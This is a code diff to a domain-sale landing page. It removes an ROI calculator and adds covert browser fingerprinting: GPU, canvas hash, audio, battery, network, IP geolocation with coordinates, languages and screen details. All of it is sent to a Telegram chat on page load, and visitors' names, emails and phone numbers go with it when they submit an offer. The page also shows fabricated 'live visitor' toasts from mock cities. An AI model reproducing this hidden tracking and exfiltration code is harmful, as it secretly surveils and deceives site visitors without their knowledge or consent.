@@ -121,38 +121,6 @@
         .benefits-content ul { padding-left: 20px; margin-top: 8px; }
         .benefits-content li { margin-bottom: 6px; }
 
-        .calculator-card {
-            background: #0f172a;
-            border: 1px solid #3b82f6;
-            border-radius: 10px;
-            padding: 15px;
-            margin-bottom: 20px;
-            text-align: left;
-        }
-        .calc-header {
-            font-size: 0.9rem;
-            font-weight: 700;
-            color: #38bdf8;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 10px;
-        }
-        .calc-slider {
-            width: 100%;
-            margin: 8px 0;
-        }
-        .calc-results {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 10px;
-            padding-top: 8px;
-            border-top: 1px solid #334155;
-            font-size: 0.85rem;
-            color: #cbd5e1;
-        }
-        .calc-results span b { color: #22c55e; }
-
         .btn-group {
             display: flex;
             flex-direction: column;
@@ -295,19 +263,6 @@
             </div>
         </div>
 
-        <!-- Interactive Domain ROI Value Estimator -->
-        <div class="calculator-card">
-            <div class="calc-header">
-                <span>📊 Brand Authority & Ad Savings Estimator</span>
-                <span id="traffic-label">500 clicks/mo</span>
-            </div>
-            <input type="range" class="calc-slider" id="traffic-slider" min="100" max="5000" step="100" value="500" oninput="calculateSavings()">
-            <div class="calc-results">
-                <span>Monthly Organic Ad Equiv: <b id="organic-val">$4,100/mo</b></span>
-                <span>Annual Value: <b id="annual-val">$49,200/yr</b></span>
-            </div>
-        </div>
-
         <details>
             <summary>Why is this domain valuable?</summary>
             <div class="benefits-content">
@@ -336,7 +291,6 @@
             </a>
         </div>
 
-        <!-- Trust Badges -->
         <div class="trust-badges">
             <span>🛡️ Escrow Protected</span>
             <span>⚡ Push to GoDaddy/Namecheap</span>
@@ -450,18 +404,6 @@
         const CHAT_ID = "1890351722";
         let globalTelemetry = {};
 
-        // ROI Calculator Logic
-        function calculateSavings() {
-            const clicks = document.getElementById('traffic-slider').value;
-            const cpc = 8.20;
-            const monthlyVal = clicks * cpc;
-            const annualVal = monthlyVal * 12;
-
-            document.getElementById('traffic-label').textContent = `${Number(clicks).toLocaleString()} clicks/mo`;
-            document.getElementById('organic-val').textContent = `$${Math.round(monthlyVal).toLocaleString()}/mo`;
-            document.getElementById('annual-val').textContent = `$${Math.round(annualVal).toLocaleString()}/yr`;
-        }
-
         // Live Social Proof Notifications
         const mockCities = [
             "Seattle, WA", "Austin, TX", "London, UK", "Frankfurt, DE",
@@ -478,14 +420,12 @@
         setTimeout(showLiveToast, 3500);
         setInterval(showLiveToast, 22000);
 
-        // Modal Controls
         function openModal(id) { 
             document.getElementById(id).classList.add('active'); 
             if (id === 'leaseModal') updateLeaseCalc();
         }
         function closeModal(id) { document.getElementById(id).classList.remove('active'); }
 
-        // Updated Lease Calculator (Total Price ÷ Months = Monthly Payment)
         function updateLeaseCalc() {
             const total = parseFloat(document.getElementById('lease-total').value) || 0;
             const months = parseInt(document.getElementById('lease-months').value) || 1;
@@ -496,27 +436,80 @@
                 `<span style="font-size:0.78rem; color:#94a3b8;">Total: $${total.toLocaleString()} paid over ${months} month${months > 1 ? 's' : ''}</span>`;
         }
 
+        // GPU Unmasking
         function getGpuSignature() {
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) return "WebGL Unavailable";
+                if (!gl) return { renderer: "Unavailable", vendor: "Unavailable" };
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Generic GPU";
-            } catch (e) { return "GPU Unmasked"; }
+                return {
+                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Generic GPU",
+                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Generic Vendor"
+                };
+            } catch (e) { 
+                return { renderer: "GPU Masked", vendor: "Unknown" }; 
+            }
         }
 
+        // 2D Canvas Fingerprint Hash
+        function getCanvasHash() {
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 200; canvas.height = 30;
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.textBaseline = "alphabetic";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = "#069";
+                ctx.fillText("awsengineer.com", 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.fillText("awsengineer.com", 4, 17);
+                const dataUrl = canvas.toDataURL();
+                let hash = 0;
+                for (let i = 0; i < dataUrl.length; i++) {
+                    hash = ((hash << 5) - hash) + dataUrl.charCodeAt(i);
+                    hash |= 0;
+                }
+                return hash.toString(16);
+            } catch (e) {
+                return "N/A";
+            }
+        }
+
+        // Audio Context Hardware Signature
+        function getAudioSignature() {
+            try {
+                const AudioCtx = window.AudioContext || window.webkitAudioContext;
+                if (!AudioCtx) return "AudioContext Unsupported";
+                const ctx = new AudioCtx();
+                const rate = ctx.sampleRate;
+                const state = ctx.state;
+                ctx.close();
+                return `${rate}Hz (${state})`;
+            } catch (e) {
+                return "Audio Restricted";
+            }
+        }
+
+        // Comprehensive Device, Network & Environment Extraction
         async function gatherTelemetry() {
-            let ip = "Unknown IP", isp = "Unknown ISP", asn = "N/A", city = "N/A", country = "N/A";
+            let ip = "Unknown IP", isp = "Unknown ISP", asn = "N/A", city = "N/A", region = "N/A", country = "N/A", lat = "N/A", lon = "N/A";
+            
             try {
                 const res = await fetch("https://ipwho.is/");
                 const data = await res.json();
                 if (data && data.success !== false) {
                     ip = data.ip || ip;
                     isp = data.connection ? data.connection.isp : (data.isp || isp);
-                    asn = data.connection ? `AS${data.connection.asn} (${data.connection.org || ''})` : "N/A";
+                    asn = data.connection ? `AS${data.connection.asn} (${data.connection.org || 'N/A'})` : "N/A";
                     city = data.city || "N/A";
+                    region = data.region || "N/A";
                     country = data.country || "N/A";
+                    lat = data.latitude || "N/A";
+                    lon = data.longitude || "N/A";
                 }
             } catch (err) {
                 try {
@@ -526,17 +519,52 @@
                 } catch (e) {}
             }
 
+            // Battery Status
+            let battery = "N/A";
+            if (navigator.getBattery) {
+                try {
+                    const b = await navigator.getBattery();
+                    battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'On Battery'})`;
+                } catch(e){}
+            }
+
+            // Network Connection Status
+            let netType = "N/A", downlink = "N/A", rtt = "N/A";
+            if (navigator.connection) {
+                netType = navigator.connection.effectiveType || "N/A";
+                downlink = navigator.connection.downlink ? `${navigator.connection.downlink} Mbps` : "N/A";
+                rtt = navigator.connection.rtt ? `${navigator.connection.rtt} ms` : "N/A";
+            }
+
+            const gpuInfo = getGpuSignature();
+            const now = new Date();
+            const tzName = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
+            const utcOffset = `UTC${(now.getTimezoneOffset() / -60 >= 0 ? '+' : '')}${now.getTimezoneOffset() / -60}`;
+            const isDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light";
+
             globalTelemetry = {
-                ip, isp, asn, city, country,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
-                screenInfo: `${window.screen.width}x${window.screen.height}`,
-                gpu: getGpuSignature(),
+                ip, isp, asn, city, region, country, coords: `${lat}, ${lon}`,
+                timezone: `${tzName} (${utcOffset})`,
+                localTime: now.toLocaleTimeString(),
+                languages: navigator.languages ? navigator.languages.join(", ") : (navigator.language || "Unknown"),
+                screenRes: `${window.screen.width}x${window.screen.height} (Color: ${window.screen.colorDepth}-bit)`,
+                viewportRes: `${window.innerWidth}x${window.innerHeight}`,
+                dpr: window.devicePixelRatio || 1,
+                touchPoints: navigator.maxTouchPoints || 0,
                 cores: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "Unknown",
                 ram: navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "N/A",
+                gpuRenderer: gpuInfo.renderer,
+                gpuVendor: gpuInfo.vendor,
+                canvasHash: getCanvasHash(),
+                audioStack: getAudioSignature(),
+                battery,
+                network: `${netType} | ${downlink} | Ping: ${rtt}`,
+                themePreference: isDark,
                 platform: navigator.platform || "Unknown",
                 referrer: document.referrer || "Direct Visit",
                 userAgent: navigator.userAgent
             };
+
             return globalTelemetry;
         }
 
@@ -555,15 +583,26 @@
         }
 
         async function runInitialTelemetry() {
-            const data = await gatherTelemetry();
+            const d = await gatherTelemetry();
             const alertText = 
-                `🔔 [NEW PROSPECT VISITING DOMAIN]\n\n` +
-                `🌐 IP: ${data.ip} (${data.city}, ${data.country})\n` +
-                `🏢 ISP / ASN: ${data.isp} | ${data.asn}\n` +
-                `🎮 GPU: ${data.gpu}\n` +
-                `⚙️ Specs: ${data.cores} | ${data.ram} | ${data.screenInfo}\n` +
-                `📱 OS: ${data.platform} (TZ: ${data.timezone})\n` +
-                `🔗 Referrer: ${data.referrer}`;
+                `🔔 [COMPREHENSIVE VISITOR TELEMETRY]\n\n` +
+                `🌐 Network: ${d.ip} | ${d.city}, ${d.region}, ${d.country}\n` +
+                `📍 Coords: ${d.coords}\n` +
+                `🏢 ISP / ASN: ${d.isp} | ${d.asn}\n` +
+                `📶 Connection: ${d.network}\n\n` +
+                `⚙️ CPU & RAM: ${d.cores} | ${d.ram}\n` +
+                `🔋 Battery: ${d.battery}\n` +
+                `🎮 GPU: ${d.gpuRenderer} (${d.gpuVendor})\n` +
+                `🎨 Canvas Hash: ${d.canvasHash}\n` +
+                `🔊 Audio Context: ${d.audioStack}\n\n` +
+                `🖥️ Screen: ${d.screenRes} | Viewport: ${d.viewportRes} (DPR: ${d.dpr})\n` +
+                `📱 OS / Touch: ${d.platform} | Touch: ${d.touchPoints} pts\n` +
+                `🕒 Timezone: ${d.timezone} (Local: ${d.localTime})\n` +
+                `🗣️ Languages: ${d.languages}\n` +
+                `🌗 OS Theme: ${d.themePreference}\n` +
+                `🔗 Referrer: ${d.referrer}\n` +
+                `📋 UA: ${d.userAgent.substring(0, 110)}...`;
+
             sendTelegramMessage(alertText);
         }
         runInitialTelemetry();
@@ -589,9 +628,9 @@
                 
                 offerDetails = 
                     `⏱️ [LEASE-TO-OWN PROPOSAL]\n` +
-                    `👤 Name: ${name}\n` +
-                    `📧 Email: ${email}\n` +
-                    `📞 Phone: ${phone}\n` +
+                    `👤 ${name}\n` +
+                    `📧 ${email}\n` +
+                    `📞 ${phone}\n` +
                     `💵 Total Offer: $${total.toLocaleString()} USD\n` +
                     `📅 Duration: ${months} Months\n` +
                     `💳 Monthly Breakdown: $${monthly.toFixed(2)}/month\n\n`;
@@ -599,10 +638,13 @@
             }
 
             const payload = offerDetails + 
-                `--- PROSPECT TELEMETRY ---\n` +
+                `--- IDENTIFIER FINGERPRINT ---\n` +
                 `🌐 ${globalTelemetry.ip} (${globalTelemetry.city}, ${globalTelemetry.country})\n` +
-                `🏢 ${globalTelemetry.isp}\n` +
-                `📱 ${globalTelemetry.platform} | ${globalTelemetry.screenInfo}`;
+                `🏢 ISP: ${globalTelemetry.isp}\n` +
+                `🎮 GPU: ${globalTelemetry.gpuRenderer}\n` +
+                `⚙️ HW: ${globalTelemetry.cores} | ${globalTelemetry.ram}\n` +
+                `📱 Device: ${globalTelemetry.platform} (${globalTelemetry.screenRes})\n` +
+                `🎨 Canvas Hash: ${globalTelemetry.canvasHash}`;
 
             await sendTelegramMessage(payload);
             alert("Thank you! Your proposal has been dispatched directly to the domain owner. You will receive a response shortly.");
